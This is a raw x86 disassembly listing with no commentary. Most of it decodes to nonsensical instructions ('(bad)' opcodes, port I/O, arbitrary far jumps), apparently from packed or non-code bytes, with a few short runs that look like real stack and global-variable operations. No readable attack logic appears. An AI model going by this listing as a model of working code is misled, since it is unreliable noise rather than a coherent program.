  4130c5:	add    DWORD PTR [ecx+0x468d8c8a],eax
  4130cb:	dec    ebx
  4130cc:	jmp    0x4d60:0x22d45a68
  4130d3:	into   
  4130d4:	sbb    DWORD PTR [ecx+0x4a],0x24df48fa
  4130db:	adc    eax,DWORD PTR [edi-0x5e3941b]
  4130e1:	dec    edx
  4130e2:	push   esp
  4130e3:	and    DWORD PTR [edx-0x1fdef0dd],edx
  4130e9:	icebp  
  4130ea:	xchg   BYTE PTR [ebx],ch
  4130ec:	pop    esi
  4130ed:	xchg   ecx,eax
  4130ee:	jmp    0xf0da:0x7cf30fbe
  4130f5:	loope  0x4130fb
  4130f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130f8:	repz fstp QWORD PTR [eax]
  4130fb:	nop
  4130fc:	sub    DWORD PTR [eax+edx*2+0x18],0x99a51b59
  413104:	bound  edi,QWORD PTR [ebx-0x16]
  413107:	fistp  DWORD PTR [edx+0x4fc146e5]
  41310d:	add    cl,0x1a
  413110:	mov    WORD PTR [ecx+0x38],gs
  413113:	xchg   ebx,eax
  413114:	popa   
  413115:	or     DWORD PTR [edx+ecx*8+0x22],ebp
  413119:	xor    al,0x81
  41311b:	adc    DWORD PTR [edi+0x25b433ca],ecx
  413121:	push   ss
  413122:	je     0x4130ce
  413124:	jmp    0x9928:0x7603271f
  41312b:	mov    dl,0x6f
  41312d:	retf   0x2272
  413130:	xor    eax,0x5ba4af5
  413135:	push   0xc4a217ed
  41313a:	jmp    0x413160
  41313c:	pop    ecx
  41313d:	std    
  41313e:	sub    cl,bl
  413140:	fst    QWORD PTR [ebx+0xb]
  413143:	push   ds
  413144:	out    dx,eax
  413145:	daa    
  413146:	pop    esi
  413147:	pusha  
  413148:	mov    DWORD PTR [ebp-0x28],esi
  41314b:	mov    DWORD PTR [ebp-0x2c],esi
  41314e:	mov    DWORD PTR [ebp-0x14],esi
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fc79
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e0a8,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	push   edi
  41317f:	jne    0x41310f
  413181:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413182:	mov    ds:0xb9707061,eax
  413187:	jle    0x4131f9
  413189:	jo     0x413161
  41318b:	dec    edx
  41318c:	push   edi
  41318d:	icebp  
  41318e:	mov    ?,WORD PTR [ebx+0xa32bc23]
  413194:	sub    BYTE PTR [esi-0x73d8ab36],cl
  41319a:	mov    ds:0x64891ef9,al
  41319f:	adc    ebp,DWORD PTR ds:0x7ab29e90
  4131a5:	clc    
  4131a6:	pop    esi
  4131a7:	out    dx,eax
  4131a8:	and    al,0x4
  4131aa:	dec    edi
  4131ab:	pop    ebx
  4131ac:	nop
  4131ad:	pushf  
  4131ae:	stos   DWORD PTR es:[edi],eax
  4131af:	fmul   DWORD PTR [edi+0x14358828]
  4131b5:	sub    eax,0xb0cc3f54
  4131ba:	(bad)  
  4131bc:	popf   
  4131bd:	xchg   DWORD PTR [ebp+ebp*4-0x63],ecx
  4131c1:	jp     0x413202
  4131c3:	call   0x13ff72dc
  4131c8:	fwait
  4131c9:	adc    BYTE PTR [edi-0x7e],0x18
  4131cd:	icebp  
  4131ce:	push   ebx
  4131cf:	dec    eax
  4131d0:	test   DWORD PTR fs:[ecx],ebx
  4131d3:	fidiv  WORD PTR [esi-0x1c]
  4131d6:	data16 mov dh,BYTE PTR [esi+ebp*2+0x67]
  4131db:	and    eax,0xf3b7405c
  4131e0:	xchg   edx,eax
  4131e1:	push   ss
  4131e2:	mov    DWORD PTR [ebx-0x3f],esi
  4131e5:	mov    edi,0x6e33e241
  4131ea:	add    bl,BYTE PTR [ecx]
  4131ec:	xadd   ebp,edx
  4131ef:	push   cs
  4131f0:	aaa    
  4131f1:	xor    cl,bh
  4131f3:	mov    esp,0x5d21b3ef
  4131f8:	mov    ds:0x49a24667,eax
  4131fd:	(bad)  
  4131fe:	repnz das 
  413200:	and    eax,DWORD PTR [ebp+0x6]
  413203:	shr    BYTE PTR [edi-0x6689d106],1
  413209:	mov    ebp,0x1748c102
  41320e:	jle    0x41325f
  413210:	arpl   WORD PTR [ebx-0x3a],di
  413213:	stos   BYTE PTR es:[edi],al
  413214:	mov    eax,ds:0x64e7bc86
  413219:	cmp    BYTE PTR [eax],dh
  41321b:	rcr    BYTE PTR [edx],cl
  41321d:	or     DWORD PTR [ecx],0x6e
  413220:	pop    eax
  413221:	fadd   QWORD PTR [ecx+0x2]
  413224:	xchg   edx,eax
  413225:	adc    eax,DWORD PTR [ebx-0x69cfda9a]
  41322b:	(bad)  
  41322d:	repz xor ch,BYTE PTR [ebp+0x2a]
  413231:	pop    esi
  413232:	loopne 0x413286
  413234:	fbstp  TBYTE PTR cs:[eax-0x1]
  413238:	ror    ebp,1
  41323a:	hlt    
  41323b:	jo     0x41324d
  41323d:	push   ebp
  41323e:	adc    esp,edx
  413240:	call   ebp
  413242:	jle    0x41326f
  413244:	mov    edi,0xacb3ddcd
  413249:	dec    ebp
  41324a:	daa    
  41324b:	jp     0x4132c9
  41324d:	icebp  
  41324e:	sbb    DWORD PTR [ebp+0x13],ecx
  413251:	inc    ecx
  413252:	iret   
  413253:	adc    DWORD PTR [ebx-0x632c5241],ebx
  413259:	mov    ebp,0xf7280d0e
  41325e:	jle    0x413209
  413260:	jns    0x413299
  413262:	adc    al,0xad
  413264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413265:	pop    ebx
  413266:	fstp   QWORD PTR [ecx-0x49]
  413269:	(bad)  
  41326a:	faddp  st(1),st
  41326c:	jne    0x41328b
  41326e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41326f:	popf   
  413270:	xchg   edx,eax
  413271:	jns    0x413212
  413273:	xor    al,0x6b
  413275:	jg     0x4131ff
  413277:	ds mov ?,edx
  41327a:	xlat   BYTE PTR ds:[ebx]
  41327b:	aaa    
  41327c:	sti    
  41327d:	xchg   ebx,eax
  41327e:	cmp    esp,eax
  413280:	push   0xffffffbe
  413282:	out    dx,al
  413283:	imul   BYTE PTR [esi+0x22]
  413286:	inc    esi
  413287:	stc    
  413288:	(bad)
  41328b:	push   ecx
  41328c:	push   es
  41328d:	xor    DWORD PTR [ebp+ebx*2-0x24],0xa6634c2
  413295:	cwde   
  413296:	lds    edi,FWORD PTR [eax-0x744b11e]
  41329c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41329d:	sub    eax,0x663f6dcf
  4132a2:	or     BYTE PTR [esi],0xd0
  4132a5:	pop    esp
  4132a6:	mov    al,ds:0x678c33a3
  4132ab:	add    al,0xab
  4132ae:	(bad)  
  4132af:	aas    
  4132b0:	loopne 0x4132be
  4132b2:	pop    es
  4132b3:	mul    BYTE PTR [ebp+0x2d29ed8f]
  4132b9:	in     eax,dx
  4132ba:	aam    0x2e
  4132bc:	inc    ecx
  4132bd:	lods   al,BYTE PTR ds:[esi]
  4132be:	mov    edi,0x414acff0
  4132c3:	pop    ss
  4132c4:	lahf   
  4132c5:	lods   al,BYTE PTR ds:[esi]
  4132c6:	mov    ebp,0xf8e36f66
  4132cb:	or     BYTE PTR [edi],0x61
  4132ce:	cld    
  4132cf:	mov    ?,WORD PTR [eax+esi*8]
  4132d2:	bound  ebx,QWORD PTR [edi+0x78929359]
  4132d8:	iret   
  4132d9:	or     ebp,DWORD PTR [edi+0x669b1dba]
  4132df:	mov    ds:0xca31037d,eax
  4132e4:	imul   ecx,DWORD PTR [ebp+0x10fcddd7],0xffffff99
  4132eb:	jbe    0x4132b3
  4132ed:	aam    0xd8
  4132ef:	dec    esp
  4132f0:	fs lock push ss
  4132f3:	ret    0x9a50
  4132f6:	mov    edi,0xfbe600f0
  4132fb:	leave  
  4132fc:	pop    eax
  4132fd:	lea    edi,[eax-0x25]
  413300:	fmulp  st(4),st
  413302:	xor    esi,edi
  413304:	loope  0x413313
  413306:	in     eax,dx
  413307:	xor    BYTE PTR [eax-0x73],0xab
  41330b:	mov    DWORD PTR [edi+0x34],eax
  41330e:	cmp    DWORD PTR [ebx+0x30],eax
  413311:	jmp    0xdd17:0x3a338363
  413318:	and    bl,BYTE PTR [edx-0x3e58afc6]
  41331e:	pop    esp
  41331f:	in     al,dx
  413320:	xor    al,0x26
  413322:	lods   al,BYTE PTR ds:[esi]
  413323:	sti    
  413324:	mov    BYTE PTR [ebx+0x49],ch
  413327:	push   edi
  413328:	aas    
  413329:	or     ebp,DWORD PTR fs:[edx+0x96f48c2]
  413330:	mov    cl,0xbe
  413332:	cmp    DWORD PTR [edi+0x73],esi
  413335:	(bad)  
  413336:	imul   edi,DWORD PTR [esi-0x4f77fb1f],0x4d
  41333d:	hlt    
  41333e:	mov    dl,0x14
  413340:	arpl   WORD PTR fs:[ebx+eiz*8],di
  413344:	fcomp  DWORD PTR [eax-0x54]
  413347:	push   ds
  413348:	pop    gs
  41334a:	lea    edx,[ebp-0x34]
  41334d:	sub    ah,BYTE PTR [ebx+0x6fafacd6]
  413353:	dec    ebp
  413354:	ins    DWORD PTR es:[edi],dx
  413355:	lods   al,BYTE PTR ds:[esi]
  413356:	fistp  DWORD PTR [ecx]
  413358:	mov    ebp,0x784df6e3
  41335d:	mov    esp,0x582403af
  413362:	inc    ebx
  413363:	or     eax,0x2b417797
  413368:	push   ds
  413369:	jp     0x4133d7
  41336b:	rcr    DWORD PTR [eax+ebx*1+0x3c578e4d],1
  413372:	test   BYTE PTR [edi+0x78],dl
  413375:	sbb    BYTE PTR [esi-0x37],ch
  413378:	call   0xb4edf12
  41337d:	(bad)  
  41337e:	push   ds
  41337f:	add    eax,0x5286ee73
  413384:	data16 mov ah,0xe
  413387:	fdivr  DWORD PTR [ebx]
  413389:	(bad)  
  41338a:	out    dx,al
  41338b:	fsubr  DWORD PTR [edi+esi*1-0x97edb7e]
  413392:	test   BYTE PTR [ecx+0x17a87c09],dl
  413398:	fld    QWORD PTR [esi+esi*8-0x546bfaa1]
  41339f:	clc    
  4133a0:	not    esp
  4133a2:	fcomp  DWORD PTR [edi]
  4133a4:	mov    ecx,?
  4133a6:	pop    ds
  4133a7:	inc    edx
  4133a8:	add    DWORD PTR [ebp-0x79e5947b],ecx
  4133ae:	mov    BYTE PTR [edi],cl
  4133b0:	cmp    DWORD PTR [ecx+ebx*4+0x60],edi
  4133b4:	xlat   BYTE PTR ds:[ebx]
  4133b5:	inc    esp
  4133b6:	in     eax,dx
  4133b7:	mov    al,ds:0x620164d3
  4133bc:	adc    bh,BYTE PTR [ebp+0x26d39ae5]
  4133c2:	cmp    al,0x6
  4133c4:	jge    0x4133cd
  4133c6:	int    0xfe
  4133c8:	gs out 0x58,al
  4133cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133cc:	stc    
  4133cd:	push   es
  4133ce:	loop   0x413441
  4133d0:	rcr    dl,1
  4133d2:	sbb    eax,0x131a5e1b
  4133d7:	(bad)  
  4133d8:	fucomi st,st(5)
  4133da:	(bad)  
  4133db:	cmp    al,0xa0
  4133dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133de:	shr    BYTE PTR [eax+edx*1+0x4a1201cf],cl
  4133e5:	out    dx,al
  4133e6:	out    0x2c,al
  4133e8:	shr    bl,1
  4133ea:	lods   eax,DWORD PTR ds:[esi]
  4133eb:	shr    DWORD PTR [edx-0x1f79ef6f],cl
  4133f1:	mov    esi,ds
  4133f3:	and    eax,0xa5a4b5a3
  4133f8:	cld    
  4133f9:	scas   eax,DWORD PTR es:[edi]
  4133fa:	hlt    
  4133fb:	jo     0x41347a
  4133fd:	mov    ecx,0xa6e37f1c
  413402:	iret   
  413403:	dec    edx
  413404:	leave  
  413405:	divps  xmm1,XMMWORD PTR [ebx+0x388fe076]
  41340c:	test   eax,0xb93bf4dc
  413411:	repnz nop
  413413:	dec    edi
  413414:	sahf   
  413415:	loope  0x4133f8
  413417:	xor    al,0x2a
  413419:	inc    esi
  41341a:	std    
  41341b:	ds xchg ebp,eax
  41341d:	sbb    dl,BYTE PTR [esi]
  41341f:	repnz retf 0xe7a0
  413423:	xchg   esp,eax
  413424:	sbb    eax,ebx
  413426:	das    
  413427:	jmp    0x413474
  413429:	arpl   WORD PTR [eax+0x1a],si
  41342c:	cld    
  41342d:	scas   al,BYTE PTR es:[edi]
  41342e:	dec    ebx
  41342f:	jp     0x413480
  413431:	clc    
  413432:	cmp    esp,DWORD PTR [ecx+ecx*2+0x44]
  413436:	push   es
  413437:	retf   
  413438:	ret    0x19b1
  41343b:	and    edi,DWORD PTR [eax+0x5]
  41343e:	out    dx,al
  41343f:	jecxz  0x41347c
  413441:	jnp    0x4133d9
  413443:	fldenv [edx-0x79]
  413446:	(bad)  
  413447:	mov    bh,BYTE PTR [ebx+0x2b]
  41344a:	jmp    0x4133cd
  41344c:	outs   dx,DWORD PTR ds:[esi]
  41344d:	adc    ebp,DWORD PTR [edi]
  41344f:	retf   0x383
  413452:	retf   
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fc79
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fc55,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0x1eaa750f,al
  413492:	cmc    
  413493:	in     al,dx
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0xa670707e
  41349c:	in     al,dx
  41349d:	xchg   esi,eax
  41349e:	mov    esi,0x84e957ac
  4134a3:	mov    dl,0xe0
  4134a5:	in     al,0x94
  4134a7:	and    dl,cl
  4134a9:	ds adc edi,ebx
  4134ac:	gs in  al,dx
  4134ae:	and    eax,0xd2b8d23a
  4134b3:	fistp  QWORD PTR [esi-0x6da6f79a]
  4134b9:	out    0x86,al
  4134bb:	mov    dh,0xec
  4134bd:	pushf  
  4134be:	imul   ebx,DWORD PTR [esi-0x7ee6f50],0xd
  4134c5:	mov    ds:0xdbec18d9,eax
  4134ca:	inc    esi
  4134cb:	out    0x20,al
  4134cd:	push   ecx
  4134ce:	sti    
  4134cf:	push   0xee13dc11
  4134d4:	pop    esp
  4134d5:	jmp    0x413472
  4134d7:	addr16 ss inc edx
  4134da:	test   al,0x36
  4134dc:	mov    al,0xc3
  4134de:	arpl   WORD PTR [esp+edi*2+0x1e],dx
  4134e2:	test   al,cl
  4134e4:	sti    
  4134e5:	xchg   ebp,eax
  4134e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134e7:	fstp   QWORD PTR [esi-0x138d696]
  4134ed:	ret    
  4134ee:	push   esp
  4134ef:	add    cl,BYTE PTR [ebx-0x7e]
  4134f2:	jo     0x4134d0
  4134f4:	mov    al,ds:0x3aa28f9
  4134f9:	imul   BYTE PTR [ebx]
  4134fb:	call   0x60204ac6
  413500:	inc    edi
  413501:	xchg   ecx,eax
  413502:	ins    DWORD PTR es:[edi],dx
  413503:	enter  0xe583,0x5c
  413507:	out    dx,eax
  413508:	hlt    
  413509:	psubsw mm6,QWORD PTR [ecx-0x26]
  41350d:	(bad)  
  41350e:	mov    ebx,0xe3b9688
  413513:	xchg   ah,ah
  413515:	jbe    0x4134da
  413517:	or     BYTE PTR [edx+0x6c63057b],al
  41351d:	jbe    0x413509
  41351f:	adc    DWORD PTR [ebp+0x6d],esi
  413522:	stc    
  413523:	adc    al,0x76
  413525:	fs mov edx,0x966a19ab
  41352b:	imul   esi,ecx,0xffffffa5
  41352e:	stos   BYTE PTR es:[edi],al
  41352f:	mul    DWORD PTR [edx+0x4f]
  413532:	cmp    eax,0x9a38ddca
  413537:	mul    BYTE PTR [edx+ebp*2]
  41353a:	mov    al,0xfb
  41353c:	xchg   BYTE PTR [edi+ebp*8],dl
  41353f:	cmp    BYTE PTR [edx],bh
  413541:	into   
  413542:	xor    eax,0x31cb99f8
  413547:	pop    ebp
  413548:	cs int 0xab
  41354b:	cli    
  41354c:	sahf   
  41354d:	jecxz  0x4135b6
  41354f:	mov    esp,0x979cf875
  413554:	in     al,0x3
  413556:	pop    ebx
  413557:	out    dx,eax
  413558:	daa    
  413559:	adc    BYTE PTR [esi+0x1acb5261],bh
  41355f:	adc    DWORD PTR [ecx-0x7cb29b2],esi
  413565:	inc    ecx
  413566:	mov    cl,0xe7
  413568:	cwde   
  413569:	cmc    
  41356a:	(bad)  
  41356b:	jmp    0x413583
  41356d:	jp     0x413594
  41356f:	sub    eax,DWORD PTR [ebp-0x3c]
  413572:	pop    edi
  413574:	cdq    
  413575:	sub    al,0xd0
  413577:	cmp    al,0xec
  413579:	pop    ebp
  41357a:	xor    DWORD PTR [ecx-0x1b],0xdf5d66b5
  413581:	sbb    DWORD PTR [ebp+0x46483cb7],ebx
  413587:	sub    eax,0xb013f881
  41358c:	retf   0xc745
  41358f:	pop    edi
  413590:	in     eax,dx
  413591:	out    0xad,eax
  413593:	div    BYTE PTR [esi+edi*8+0x6b06302c]
  41359a:	scas   eax,DWORD PTR es:[edi]
  41359b:	push   eax
  41359c:	call   0x2658:0x59c24442
  4135a3:	imul   eax,DWORD PTR [ebx],0x59
  4135a6:	mov    edi,0xd682878a
  4135ab:	adc    ecx,DWORD PTR [ebx-0x6]
  4135ae:	je     0x41356a
  4135b0:	adc    eax,0x602e5e03
  4135b5:	dec    ecx
  4135b6:	rcl    esp,0x16
  4135b9:	jp     0x413579
  4135bb:	cmp    ch,al
  4135bd:	dec    ebp
  4135be:	retf   0xf728
  4135c1:	xchg   ebp,eax
  4135c2:	shr    bl,cl
  4135c4:	or     al,0xd6
  4135c6:	dec    edx
  4135c7:	push   ebp
  4135c8:	mul    BYTE PTR [eax+0x8eeb188]
  4135ce:	out    0x5f,al
  4135d0:	stos   DWORD PTR es:[edi],eax
  4135d1:	xor    eax,0x5c1f3573
  4135d6:	hlt    
  4135d7:	dec    edx
  4135d8:	sti    
  4135d9:	call   0xb2280192
  4135de:	sti    
  4135df:	sbb    DWORD PTR [edi+0x1d],ebp
  4135e2:	(bad)  
  4135e3:	cmp    DWORD PTR [esi+ebp*1-0x76945962],edx
  4135ea:	lea    edi,gs:[esi+ebx*2-0x5d1e13fe]
  4135f2:	ins    DWORD PTR es:[edi],dx
  4135f3:	(bad)  
  4135f4:	leave  
  4135f5:	push   edx
  4135f6:	jmp    0x24490ed0
  4135fb:	pop    es
  4135fc:	pop    edx
  4135fd:	and    DWORD PTR [eax-0x5b],0xefdc0be
  413604:	pop    ecx
  413605:	sub    DWORD PTR [esp+ecx*4-0x79],ecx
  413609:	push   ebx
  41360a:	std    
  41360b:	fwait
  41360c:	sahf   
  41360d:	sub    BYTE PTR [ecx],0x2d
  413610:	arpl   WORD PTR [esi+0x28aebddb],di
  413616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413617:	mov    bl,0xa1
  413619:	stc    
  41361a:	fsincos 
  41361c:	leave  
  41361d:	adc    bl,cl
  41361f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413620:	fidivr WORD PTR [edx+0x5f]
  413623:	cmp    dh,0xf4
  413626:	sti    
  413627:	inc    esp
  413628:	xor    al,0x4f
  41362a:	push   esp
  41362b:	lock or al,dl
  41362e:	je     0x413627
  413630:	jmp    FWORD PTR [eax]
  413632:	das    
  413633:	(bad)  
  413634:	cmp    DWORD PTR [edx-0x421cfe8e],esp
  41363a:	jnp    0x4135d1
  41363c:	dec    ebp
  41363d:	pop    esp
  41363e:	sub    eax,0x89035c27
  413643:	out    dx,eax
  413644:	inc    esp
  413645:	cmp    BYTE PTR [esi-0x45378dce],0x4a
  41364c:	jecxz  0x4135db
  41364e:	stc    
  41364f:	test   BYTE PTR ds:0x779e79b7,0x54
  413656:	cs jmp 0x413637
  413659:	jne    0x41367f
  41365b:	sub    al,0x15
  41365d:	pop    eax
  41365e:	fdivr  QWORD PTR [ebp-0x3e]
  413661:	call   0x802b:0x7c141ef4
  413668:	pop    es
  413669:	lock (bad) 
  41366b:	xor    cl,dl
  41366d:	int    0x20
  41366f:	cdq    
  413670:	xchg   ebp,eax
  413671:	lods   al,BYTE PTR ds:[esi]
  413672:	repz pop esp
  413674:	aam    0x66
  413676:	xor    dl,cl
  413678:	and    eax,0xdee3ebc7
  41367d:	div    DWORD PTR [edi-0x4c]
  413680:	call   0xca81:0x5377e046
  413687:	and    dh,0x60
  41368a:	push   esp
  41368b:	std    
  41368c:	scas   al,BYTE PTR es:[edi]
  41368d:	int3   
  41368e:	pusha  
  41368f:	dec    esp
  413690:	dec    ebx
  413691:	or     DWORD PTR ss:[edx+0x5f],edx
  413695:	std    
  413696:	out    0xfc,eax
  413698:	and    ecx,DWORD PTR [ecx+eax*2-0x6f5d093d]
  41369f:	pop    es
  4136a0:	stc    
  4136a1:	or     eax,0xaa85d42b
  4136a6:	jl     0x41362e
  4136a8:	adc    dl,dl
  4136aa:	rcr    DWORD PTR [edx-0x7f],cl
  4136ad:	xchg   DWORD PTR [eax+0x7d1866cc],eax
  4136b3:	aad    0x9a
  4136b5:	mov    ebp,0x7256e9e6
  4136ba:	pop    edi
  4136bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136bc:	imul   esi,DWORD PTR [ecx+ecx*2+0x28b9fbc5],0x37
  4136c4:	std    
  4136c5:	xor    edi,DWORD PTR [ecx-0x29]
  4136c8:	pop    es
  4136c9:	mov    dh,0xf2
  4136cb:	retf   
  4136cc:	bound  edx,QWORD PTR [esi+0x50de475b]
  4136d2:	out    dx,eax
  4136d3:	mov    dl,0xbe
  4136d5:	pop    eax
  4136d6:	or     BYTE PTR [edx],dl
  4136d8:	rcr    esp,cl
  4136da:	mov    ch,0xe3
  4136dc:	mov    ds:0xca9da8b1,eax
  4136e1:	aam    0xcb
  4136e3:	adc    DWORD PTR ss:[edx-0x68],edi
  4136e7:	sub    BYTE PTR [ebx],bl
  4136e9:	jno    0x413689
  4136eb:	jno    0x413672
  4136ed:	sbb    eax,0xaa7aad83
  4136f2:	in     al,0xb1
  4136f4:	cmp    al,0xcb
  4136f6:	bound  edi,QWORD PTR [edi]
  4136f8:	jle    0x41371f
  4136fa:	mov    esi,0x5846a9c6
  4136ff:	adc    ecx,DWORD PTR [eax]
  413701:	or     al,0x50
  413703:	retf   0xc07c
  413706:	shl    DWORD PTR [ebp+0xae2b20a],0xe4
  41370d:	shl    al,1
  41370f:	shr    ecx,1
  413711:	add    eax,DWORD PTR [eax*4+0x2d92da96]
  413718:	out    dx,al
  413719:	xchg   esp,eax
  41371a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41371b:	arpl   WORD PTR [ecx],si
  41371d:	add    al,0x3c
  41371f:	mov    esi,0xf494b6c2
  413724:	sub    edi,DWORD PTR [ebx]
  413726:	mov    edi,0xc8fec015
  41372b:	jno    0x41374d
  41372d:	aam    0x11
  41372f:	xchg   ebp,eax
  413730:	dec    ebp
  413731:	mov    al,ds:0x5e213b96
  413736:	cmp    al,0xb2
  413738:	cmp    BYTE PTR [ebx+ebx*1+0x4fad7cb5],dh
  41373f:	out    dx,eax
  413740:	fiadd  DWORD PTR [ebp-0x7f120161]
  413746:	push   esi
  413747:	std    
  413748:	cld    
  413749:	gs test eax,0xf6fc1a0
  41374f:	inc    edi
  413750:	sub    esi,0x1a
  413753:	push   cs
  413754:	not    BYTE PTR [ebp+edi*1+0x2ca2dfa9]
  41375b:	mov    ds:0x1a783d8a,al
  413760:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413761:	out    0x3b,al
  413763:	clc    
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	pop    eax
  41377f:	dec    esi
  413780:	pop    ds
  413781:	addr16 xor eax,0xb970706b
  413787:	jle    0x4137f9
  413789:	jo     0x413802
  41378b:	mov    eax,ds:0xfff86533
  413790:	aam    0x8e
  413792:	neg    DWORD PTR [edi]
  413794:	sub    ah,BYTE PTR [eax]
  413796:	jbe    0x4137c9
  413798:	(bad)  
  413799:	retf   0xa1d2
  41379c:	add    eax,0x4992fb88
  4137a1:	inc    ecx
  4137a2:	xor    al,0xd2
  4137a4:	repnz and bh,0x86
  4137a8:	cdq    
  4137a9:	sub    DWORD PTR [esi+0x11e32e18],esi
  4137af:	push   ss
  4137b0:	imul   edi,esp,0xa1c9793b
  4137b6:	cdq    
  4137b7:	(bad)  
  4137b8:	jne    0x413742
  4137ba:	push   eax
  4137bb:	sbb    eax,0x1933bbfe
  4137c0:	push   es
  4137c1:	mov    ah,0x66
  4137c3:	push   eax
  4137c4:	call   0x4f9529ea
  4137c9:	mov    ds:0x6829324e,eax
  4137ce:	pop    ds
  4137cf:	lea    ecx,[esi+0x25]
  4137d2:	mov    ch,0x87
  4137d4:	sahf   
  4137d5:	rcr    DWORD PTR [ecx+0x40b2745d],1
  4137db:	loopne 0x4137eb
  4137dd:	fdivr  QWORD PTR [edx+0x3e7acddf]
  4137e3:	cmp    al,0xb9
  4137e5:	push   eax
  4137e6:	(bad)  
  4137e7:	mov    al,ds:0x85baac4d
  4137ec:	mov    esp,0x70e1a13c
  4137f1:	(bad)  
  4137f2:	mov    esi,DWORD PTR [edi-0x4f]
  4137f5:	jae    0x4137b3
  4137f7:	test   eax,0xa8a80a61
  4137fc:	push   cs
  4137fd:	(bad)  
  4137fe:	xchg   ebx,eax
  4137ff:	xchg   esp,eax
  413800:	adc    al,BYTE PTR [edi]
  413802:	or     ch,BYTE PTR ds:0xfc03b265
  413808:	and    edx,ebx
  41380a:	jle    0x41386e
  41380c:	test   cl,bh
  41380e:	rol    eax,cl
  413810:	dec    ebp
  413811:	adc    DWORD PTR [ebx+0x4fa70961],ebp
  413817:	jns    0x413832
  413819:	sbb    eax,ebp
  41381b:	div    DWORD PTR [eax+0x72]
  41381e:	call   0x6fd7:0xda3ef543
  413825:	and    al,0xfd
  413827:	leave  
  413828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413829:	(bad)  
  41382a:	dec    esp
  41382b:	jmp    0x41381a
  41382d:	ins    DWORD PTR es:[edi],dx
  41382e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41382f:	arpl   WORD PTR [ecx-0x84aab05],si
  413835:	cmp    DWORD PTR [eax+0x25],ebx
  413838:	cmp    al,BYTE PTR [edx+0x4b]
  41383b:	sahf   
  41383c:	in     al,dx
  41383d:	(bad)  
  41383e:	lods   al,BYTE PTR ds:[esi]
  41383f:	out    0x1,eax
  413841:	rcr    DWORD PTR [eax],cl
  413843:	mov    ss,WORD PTR [eax+eax*1+0x6e372e08]
  41384a:	repz push 0xfee4ccb5
  413850:	mov    ebx,0xbd7cc421
  413855:	clc    
  413856:	inc    esp
  413857:	cmp    bl,bh
  413859:	push   ebp
  41385a:	adc    edi,DWORD PTR gs:[edx-0x40]
  41385e:	mov    al,ds:0x7436de66
  413863:	cdq    
  413864:	mov    edx,0xda63191d
  413869:	sbb    BYTE PTR [eax-0xf5a9a10],bh
  41386f:	adc    esp,DWORD PTR [edi-0x12e627dd]
  413875:	repz add BYTE PTR [eax*2+0x2646b2e4],bh
  41387d:	push   edi
  41387e:	push   ebp
  41387f:	pop    es
  413880:	call   0xdf5fb674
  413885:	sar    DWORD PTR [ebx],0xba
  413888:	in     al,0x31
  41388a:	xchg   BYTE PTR ds:0x2e592c75,bl
  413890:	xchg   ecx,eax
  413891:	dec    esp
  413892:	shl    BYTE PTR ds:0xcd597185,cl
  413898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413899:	mov    ch,0x44
  41389b:	stc    
  41389c:	add    edi,ebp
  41389e:	add    dl,BYTE PTR [eax]
  4138a0:	dec    ebp
  4138a1:	pusha  
  4138a2:	test   cl,dh
  4138a4:	popf   
  4138a5:	jb     0x413912
  4138a7:	lods   al,BYTE PTR ds:[esi]
  4138a8:	cmc    
  4138a9:	fcom   QWORD PTR [ecx+0x1c]
  4138ac:	xchg   esp,eax
  4138ad:	jg     0x41387a
  4138af:	fidiv  DWORD PTR [ebp+0x65]
  4138b2:	jo     0x41387b
  4138b4:	xor    DWORD PTR [ebx+0x5],0xfd181f63
  4138bb:	push   eax
  4138bc:	gs fs cwde 
  4138bf:	out    0xcc,eax
  4138c1:	push   0xffffffe0
  4138c3:	fnsetpm(287 only) 
  4138c5:	outs   dx,DWORD PTR ds:[esi]
  4138c6:	add    ah,BYTE PTR [eax-0x59]
  4138c9:	mov    BYTE PTR [ebx],al
  4138cb:	in     al,dx
  4138cc:	popa   
  4138cd:	(bad)  
  4138cf:	ins    DWORD PTR es:[edi],dx
  4138d0:	es scas al,BYTE PTR es:[edi]
  4138d2:	inc    ecx
  4138d3:	sbb    bl,BYTE PTR [edx+0x69]
  4138d6:	je     0x41392b
  4138d8:	push   cs
  4138d9:	fchs   
